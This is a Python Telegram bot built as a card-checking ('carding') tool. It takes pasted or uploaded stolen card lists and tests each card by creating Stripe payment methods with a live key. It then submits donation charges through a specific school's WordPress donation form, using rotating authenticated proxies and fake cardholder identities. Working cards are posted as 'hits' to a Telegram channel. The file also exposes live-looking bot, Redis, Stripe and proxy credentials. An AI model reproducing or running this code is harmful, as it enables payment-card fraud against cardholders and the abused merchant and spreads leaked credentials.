import requests
import time
import telebot
from concurrent.futures import ThreadPoolExecutor
import itertools
import random
import os
from upstash_redis import Redis

# --- PERMANENT AUTH & FAKE DATA (CLOUD BASED) ---
redis = Redis(url="https://cool-lark-22200.upstash.io", token="AVa4AAIncDJiM2QxMWFjZmE4ZTA0ZGI5YTBiMWU1MWQ0MGU0YTljY3AyMjIyMDA")

ADMIN_ID = 1108807786  # <--- SET YOUR TELEGRAM ID HERE

def is_authorized(user_id):
    if user_id == ADMIN_ID: return True
    return redis.sismember("authorized_members", str(user_id))

def get_fake_user():
    first = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
    name = f"{random.choice(first)} {random.choice(last)}"
    email = f"{name.replace(' ', '').lower()}{random.randint(100, 999)}@gmail.com"
    return name, email

# --- INITIALIZATION (YOUR ORIGINAL) ---
STRIPE_PUBLIC_KEY = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
WP_AJAX_URL = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php'
active_checks = {}

# --- PROXIES (YOUR ORIGINAL) ---
RAW_PROXIES = [
  "176.46.143.183:42887:hVxplBSfzTP2toe:sG1fXzB0jTlziPn",
  "167.160.183.131:8800:203039:7VCXXNrj",
  "103.129.118.26:21255:podaomma55403:qfeg6z02fl",
  "176.46.143.201:48128:8MkFiStKkZTb4YR:Zeeu3e49zjoXSrR",
  "176.46.143.220:43558:u4p47qZAUqAkuyo:PNsoVIDOwYrdHpc",
  "176.46.143.9:44253:NmkAEhCenIi1pI3:N8EfQoQsfIZP7v8",
  "206.232.28.198:21266:hasamrafe55398:42vwax8ii5",
  "168.91.122.86:21241:hasamrafe55398:42vwax8ii5",
  "154.37.90.76:21248:hasamrafe55398:42vwax8ii5",
  "168.91.123.85:21323:hasamrafe55398:42vwax8ii5",
  "154.13.65.94:21230:hasamrafe55398:42vwax8ii5",
  "154.13.65.163:21231:hasamrafe55398:42vwax8ii5",
  "204.217.190.107:21237:hasamrafe55398:42vwax8ii5",
  "204.217.190.157:21321:hasamrafe55398:42vwax8ii5",
  "206.232.27.54:21324:hasamrafe55398:42vwax8ii5",
  "206.232.27.59:21328:hasamrafe55398:42vwax8ii5",
  "66.63.186.149:8800:203039:7VCXXNrj",
  "167.160.183.112:8800:203039:7VCXXNrj",
  "66.63.186.111:8800:203039:7VCXXNrj",
  "66.63.186.83:8800:203039:7VCXXNrj",
  "167.160.183.95:8800:203039:7VCXXNrj",
  "167.160.183.133:8800:203039:7VCXXNrj",
  "167.160.183.184:8800:203039:7VCXXNrj",
  "66.63.186.138:8800:203039:7VCXXNrj",
  "168.91.123.127:21306:justinbike55428:Hasam124",
  "168.91.125.252:21281:justinbike55428:Hasam124",
  "168.91.125.6:21280:justinbike55428:Hasam124",
  "206.232.87.227:21238:justinbike55428:Hasam124",
  "206.232.28.124:21319:justinbike55428:Hasam124"
]

def format_proxy(p_str):
    try:
        parts = p_str.split(':')
        return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}", "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
    except: return None

proxy_pool = itertools.cycle([format_proxy(p) for p in RAW_PROXIES if format_proxy(p)])

BOT_TOKEN = "8069200820:AAHq2j84AA4X3Hws1T3VmCzo_mdOFPOaCk4"
CHANNEL_ID = -1003830681372 
bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

# --- AUTH COMMAND ---
@bot.message_handler(commands=['auth'])
def handle_auth(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        target_id = m.text.split()[1]
        redis.sadd("authorized_members", str(target_id))
        bot.reply_to(m, f"✅ User {target_id} authorized permanently.")
    except: bot.reply_to(m, "Usage: /auth telegram_id")

def get_bin_info(cc_num):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
        return f"{res.get('brand','N/A').upper()} - {res.get('type','N/A').upper()}", f"{res.get('country_name','N/A').upper()} {res.get('country_flag','🏳️')}", res.get('bank','N/A').upper()
    except: return "N/A", "UNKNOWN 🏳️", "N/A"

# --- ENGINE (RETRY LOGIC ADDED) ---
def process_card(cc_data, user_id):
    if not active_checks.get(user_id): return None
    
    # Try up to 3 different proxies if one fails
    for _ in range(3):
        current_proxy = next(proxy_pool)
        proxy_ip = current_proxy['http'].split('@')[-1]
        
        try:
            parts = cc_data.strip().split('|')
            cc, mon, year, cvc = parts[0], parts[1], parts[2], parts[3]
            full_year = f"20{year}" if len(year) == 2 else year
            brand, country, bank = get_bin_info(cc)
            
            f_name, f_email = get_fake_user()

            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            }
            stripe_data = {
                'type': 'card', 'billing_details[name]': f_name,
                'card[number]': cc, 'card[cvc]': cvc, 'card[exp_month]': mon, 'card[exp_year]': full_year,
                'key': STRIPE_PUBLIC_KEY, 'payment_user_agent': 'stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; card-element'
            }
            
            # Increased timeout to 25 to handle slow proxy connections
            pm_resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxies=current_proxy, timeout=25).json()
            pm_id = pm_resp.get('id')

            if not pm_id:
                msg = pm_resp.get('error', {}).get('message', 'PM Creation Failed')
                return {"status": "Declined ❌", "msg": msg, "card": cc_data, "country": country, "bank": bank, "bin": brand, "proxy": proxy_ip}

            donation_data = {
                'action': 'wp_full_stripe_inline_donation_charge',
                'wpfs-form-name': 'donate',
                'wpfs-form-get-parameters': '{}',
                'wpfs-custom-amount': 'other',
                'wpfs-custom-amount-unique': '1',
                'wpfs-donation-frequency': 'one-time',
                'wpfs-billing-name': f_name,
                'wpfs-billing-address-country': 'US',
                'wpfs-billing-address-line-1': '80,Allen st',
                'wpfs-billing-address-city': 'New York ',
                'wpfs-billing-address-state-select': 'NY',
                'wpfs-billing-address-zip': '10002',
                'wpfs-card-holder-email': f_email,
                'wpfs-card-holder-name': f_name,
                'wpfs-stripe-payment-method-id': pm_id,
            }
            
            # Increased timeout to 25 to handle site response
            final_response = requests.post(WP_AJAX_URL, data=donation_data, proxies=current_proxy, timeout=25)
            result = final_response.json()
            msg = result.get('exception', result.get('message', 'No exception message provided'))
            
            if result.get('success') == True: status = "CHARGED ✅"
            elif "insufficient" in msg.lower(): status = "Low Funds 💰"
            elif any(x in msg.lower() for x in ["security code", "incorrect_cvc"]): status = "CCN ☑️"
            elif "redirect" in str(result).lower(): status = "3DS REQUIRED 🛡️"
            else: status = "Declined ❌"
            
            return {"status": status, "msg": msg, "card": cc_data, "country": country, "bank": bank, "bin": brand, "proxy": proxy_ip}
        
        except (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            # If proxy fails or times out, the loop continues to the next proxy
            continue
        except Exception as e:
            # If logic fails (not proxy related), return original error
            return {"status": "Error ⚠️", "msg": "TIMEOUT/ENGINE_ERR", "card": cc_data, "country": "N/A", "bank": "N/A", "bin": "N/A", "proxy": proxy_ip}

    # If the loop finishes without returning, it means all 3 proxies failed
    return {"status": "Error ⚠️", "msg": "ALL PROXIES FAILED", "card": cc_data, "country": "N/A", "bank": "N/A", "bin": "N/A", "proxy": "MESH_FAIL"}

# --- ORIGINAL UI COMMANDS ---
@bot.message_handler(commands=['start'])
def welcome(m):
    text = """
<pre>
█▓▒░  STRIPE :: PREMIUM CORE  ░▒▓█
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ SYSTEM ]  ONLINE ██████████ 100%
[ MODE   ]  ELITE / UHQ
[ SPEED  ]  MAXIMUM THROUGHPUT
[ ROUTE  ]  CUSTOM PROXY MESH ACTIVE

┌─[ ENGINE STATS ]
│  ▸ Requests / Cycle : 3000
│  ▸ Batch Capacity   : 3,000
│  ▸ Latency          : &lt; LOW &gt;
│  ▸ Stability        : &lt; HIGH &gt;
└───────────────────

┌─[ SECURITY LAYER ]
│  ▸ Anti-Fingerprint : ENABLED
│  ▸ Dynamic Routing  : ENABLED
│  ▸ Load Balancer    : AUTO
└───────────────────

[ STATUS ]  RUNNING ▣▣▣
[ ACCESS ]  RESTRICTED
[ TRACE  ]  DISABLED

👑 OPERATOR : Казимир
🌍 NODE     : ARGENTINA 🇦🇷
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
:: BUILT FOR SPEED — NOT FOR NOOBS ::
</pre>
"""
    bot.reply_to(m, text, parse_mode="HTML")

@bot.message_handler(commands=['cook'], content_types=['text', 'document'])
def handle_cook(m):
    if not is_authorized(m.from_user.id):
        bot.reply_to(m, "❌ <b>ACCESS DENIED.</b>", parse_mode="HTML")
        return

    target = m.reply_to_message if m.reply_to_message else m
    lines = []
    uname = m.from_user.first_name

    if target.document and target.document.mime_type == 'text/plain':
        file_info = bot.get_file(target.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = [l.strip() for l in downloaded_file.decode('utf-8').split('\n') if '|' in l]
    else:
        raw_text = target.text or target.caption or ""
        lines = [l.strip() for l in raw_text.split('\n') if '|' in l]

    if not lines:
        bot.reply_to(m, "<b>❌ No cards found.</b>", parse_mode="HTML")
        return

    active_checks[m.from_user.id] = True
    total = len(lines[:3000])
    status_msg = bot.send_message(m.chat.id, "🚀 <b>𝗘𝗡𝗚𝗜𝗡𝗘 𝗦𝗧𝗔𝗥𝗧𝗘𝗗…</b>", parse_mode="HTML")
    stats = {"app":0, "ccn":0, "low":0, "dec":0, "err":0, "done":0}
    last_upd = 0

    with ThreadPoolExecutor(max_workers=10) as executor:
        for res in executor.map(lambda l: process_card(l, m.from_user.id), lines[:3000]):
            if not active_checks.get(m.from_user.id): break
            if not res: continue
            
            stats["done"] += 1
            s = res['status']
            if "CHARGED" in s: stats["app"] += 1
            elif "CCN" in s or "3DS" in s: stats["ccn"] += 1 
            elif "Low Funds" in s: stats["low"] += 1
            elif "Error" in s: stats["err"] += 1
            else: stats["dec"] += 1

            if time.time() - last_upd >= 5.0 or stats["done"] == total:
                ui = (
                    f"🇦🇷 <b>𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐒𝐓𝐀𝐓𝐒</b> 🇦🇷\n\n"
                    f"• CARD: <code>{res['card']}</code>\n"
                    f"• PROXY: <code>{res['proxy']}</code>\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"• STATUS: {res['status']}\n"
                    f"• REASON: {res['msg']}\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"• Charged ✅: [<code>{stats['app']}</code>]\n"
                    f"• CCN/3DS ☑️: [<code>{stats['ccn']}</code>]\n"
                    f"• Low Funds 💰: [<code>{stats['low']}</code>]\n"
                    f"• DECLINED ❌: [<code>{stats['dec']}</code>]\n"
                    f"• TOTAL 📊: [<code>{stats['done']}/{total}</code>]\n"
                    f"━━━━━━━━━━━━━━"
                )
                try: 
                    bot.edit_message_text(ui, m.chat.id, status_msg.message_id, parse_mode="HTML")
                    last_upd = time.time()
                except: pass

            if any(x in s for x in ["CHARGED", "CCN", "Low Funds", "3DS"]):
                hit = (
                    f"🔥 <b>𝗦𝗧𝗥𝗜𝗣𝗘 :: 𝗛𝗜𝗧</b> 🔥\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"💳 𝗖𝗔𝗥𝗗     : <code>{res['card']}</code>\n"
                    f"📋 𝗦𝗧𝗔𝗧𝗨𝗦   : <b>{res['status']}</b>\n"
                    f"💬 𝗥𝗘𝗔𝗦𝗢𝗡   : {res['msg']}\n"
                    f"🛰 𝗣𝗥𝗢𝗫𝗬    : <code>{res['proxy']}</code>\n\n"
                    f"🌍 𝗕𝗜𝗡      : {res['bin']} | {res['country']}\n"
                    f"🏦 𝗕𝗔𝗡𝗞     : {res['bank']}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 : <b>{uname}</b>"
                )
                bot.send_message(m.chat.id, hit, parse_mode="HTML")
                try: bot.send_message(CHANNEL_ID, hit, parse_mode="HTML")
                except: pass
    active_checks[m.from_user.id] = False

@bot.message_handler(commands=['stop'])
def stop(m):
    active_checks[m.from_user.id] = False
    bot.reply_to(m, "🛑 Engine Stopped.")

while True:
    try: bot.polling(none_stop=True, interval=0, timeout=15)
    except: time.sleep(5)
